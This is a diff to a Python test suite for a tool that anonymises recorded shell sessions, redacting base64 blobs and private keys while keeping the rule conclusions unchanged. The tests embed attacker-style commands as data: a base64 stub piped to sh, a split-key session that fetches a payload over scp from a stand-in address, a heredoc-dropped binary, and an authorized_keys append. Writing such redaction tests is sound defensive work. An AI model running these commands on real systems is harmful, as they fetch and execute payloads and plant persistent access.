@@ -97,16 +97,106 @@ def test_a_short_hex_marker_is_left_intact() -> None:
     assert Anonymiser().text(probe) == probe
 
 
+# Realistic base64: mixed case and digits, which is what encoded data looks
+# like and what separates it from a long path or a hex digest.
+BLOB = "IyEvYmluL3NoCmNkIC90bXAgfHwgY2QgL3Zhci90bXAKd2dldCBodHRwOi8vZXhhbXBsZQo" * 3
+
+
 def test_a_long_base64_blob_is_cut() -> None:
-    blob = "A" * 200
-    out = Anonymiser().text(f"echo {blob} | base64 -d | sh")
-    assert blob not in out
-    assert "+184 chars sha256:" in out
+    out = Anonymiser().text(f"echo {BLOB} | base64 -d | sh")
+    assert BLOB not in out
+    assert f"<base64: {len(BLOB)} chars sha256:" in out
+
+
+def test_nothing_of_an_encoded_run_is_kept_not_even_a_prefix() -> None:
+    """Sixteen characters from every line of a ten-line key is a quarter of
+    the key, and partial-key-exposure attacks work from fractions like that."""
+    out = Anonymiser().text(f"echo {BLOB}")
+    assert BLOB[:8] not in out
+
+
+def test_a_long_path_is_not_mistaken_for_encoded_data() -> None:
+    path = "/usr/local/share/applications/somethingverylongwithoutanydigits/bin"
+    assert Anonymiser().text(f"ls {path}") == f"ls {path}"
 
 
 def test_a_sha256_written_in_a_command_is_left_intact() -> None:
     digest = "a" * 64
     assert digest in Anonymiser().text(f"sha256sum -c {digest}")
+
+
+# --- Private keys -----------------------------------------------------------
+#
+# The first real sample contained a session that wrote an OpenSSH private key
+# to disk one line per command and used it to fetch its payload over scp. Every
+# line was under the old 80-character threshold, so all ten went through. The
+# key below is invented; only its shape is taken from that session.
+
+# Markers are built at runtime so no scanner sees a literal key block in the repo.
+_BEGIN = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
+_END = "-----END OPENSSH " + "PRIVATE KEY-----"
+_BEGIN_RSA = "-----BEGIN RSA " + "PRIVATE KEY-----"
+_END_RSA = "-----END RSA " + "PRIVATE KEY-----"
+
+FAKE_KEY_LINES = (
+    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+    "QyNTUxOQAAACBhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkAAAAJmFiY2",
+    "RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0",
+    "dXZ3eHl6MDEyMzQ1Njc4OQAAAA",
+)
+SPLIT_KEY_SESSION = (
+    f"cd /tmp || cd /var/tmp; echo '{_BEGIN}",
+    *FAKE_KEY_LINES,
+    f"{_END}' > key.ppk; echo 'StrictHostKeyChecking no' > sshcfg",
+    f"{_END} > key.ppk",
+    "chmod 400 key.ppk; scp -i key.ppk dlr@203.0.113.9:sh out_sh",
+)
+
+
+def test_a_key_pasted_one_line_per_command_does_not_survive() -> None:
+    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION))
+    joined = "\n".join(out.commands)
+    for line in FAKE_KEY_LINES:
+        assert line not in joined
+        assert line[:12] not in joined
+
+
+def test_no_private_key_marker_survives_for_the_commit_hook_to_find() -> None:
+    """The repository refuses commits containing a private-key header. That
+    hook should never have to be what catches this."""
+    joined = "\n".join(Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands)
+    assert "PRIVATE KEY-----" not in joined
+
+
+def test_what_the_session_did_with_the_key_is_kept() -> None:
+    """The key goes; the fact that it was written and used stays."""
+    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands
+    assert "> key.ppk" in out[len(FAKE_KEY_LINES) + 1]
+    assert out[-1].startswith("chmod 400 key.ppk; scp -i key.ppk")
+    assert len(out) == len(SPLIT_KEY_SESSION)
+
+
+def test_a_key_block_inside_one_command_is_replaced_whole() -> None:
+    command = f"echo '{_BEGIN_RSA}\n" + "\n".join(FAKE_KEY_LINES) + f"\n{_END_RSA}' > id_rsa"
+    out = Anonymiser().facts(facts(command)).commands[0]
+    assert all(line not in out for line in FAKE_KEY_LINES)
+    assert "<private key: RSA PRIVATE KEY" in out
+    assert out.endswith("> id_rsa")
+
+
+def test_a_key_that_never_closes_is_redacted_to_the_end() -> None:
+    """Losing a few commands is the right trade against publishing a key."""
+    out = Anonymiser().facts(facts(f"echo '{_BEGIN}", *FAKE_KEY_LINES))
+    assert all(line not in "\n".join(out.commands) for line in FAKE_KEY_LINES)
+
+
+def test_a_binary_pasted_through_a_base64_heredoc_does_not_survive() -> None:
+    """The first real sample held a 64-bit ELF delivered this way, 64
+    characters to a command, every line under the old threshold."""
+    lines = tuple(BLOB[i : i + 64] for i in range(0, 192, 64))
+    out = Anonymiser().facts(facts("base64 -d > /tmp/hum <<.", *lines)).commands
+    assert out[0] == "base64 -d > /tmp/hum <<."
+    assert all(line not in "\n".join(out) for line in lines)
 
 
 # --- The invariant the evaluation depends on -------------------------------
@@ -125,6 +215,7 @@ def test_a_sha256_written_in_a_command_is_left_intact() -> None:
         ('cd ~ && mkdir .ssh && echo "ssh-rsa ' + "A" * 300 + '" >> .ssh/authorized_keys',),
         ("uname -a", "cat /proc/cpuinfo", "nproc"),
         ("enable", "system", "shell", "sh"),
+        SPLIT_KEY_SESSION,
     ],
 )
 def test_anonymising_never_changes_what_the_rules_conclude(commands: tuple[str, ...]) -> None:
